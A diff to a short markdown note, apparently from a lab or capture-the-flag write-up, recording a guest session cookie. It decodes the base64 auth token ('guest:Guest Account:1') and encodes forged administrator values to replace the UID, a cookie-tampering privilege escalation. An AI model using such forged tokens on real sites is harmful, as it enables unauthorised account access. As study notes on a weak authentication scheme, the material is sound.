@@ -1,7 +1,7 @@
 # Cookie
 
 ## Found Cookie with Guest User Login
-
+```
 [
     {
         "name": "uid",
@@ -49,3 +49,28 @@
         "storeId": null
     }
 ]
+```
+
+## Auth Token
+Z3Vlc3Q6R3Vlc3QgQWNjb3VudDox
+Decode
+```
+echo "Z3Vlc3Q6R3Vlc3QgQWNjb3VudDox" | base64 -d
+guest:Guest Account:1
+```
+Encode
+```
+echo "administrator:administrator Account:0" | base64
+YWRtaW5pc3RyYXRvcjphZG1pbmlzdHJhdG9yIEFjY291bnQ6MAo=
+```
+
+
+Change the UID to
+
+
+```
+echo "admin:administrator Account:23" | base64
+YWRtaW46YWRtaW5pc3RyYXRvciBBY2NvdW50OjIzCg==
+```
+
+
